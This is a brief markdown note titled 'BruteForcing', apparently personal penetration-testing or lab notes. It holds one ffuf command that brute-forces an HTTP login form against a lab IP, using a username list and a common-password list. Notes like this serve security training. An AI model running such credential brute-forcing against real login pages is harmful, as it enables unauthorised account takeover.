---
  title: "BruteForcing"
---
# HTTP Login page
#### ffuf
`ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d` `"username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.93.83/customers/login -fc 200`
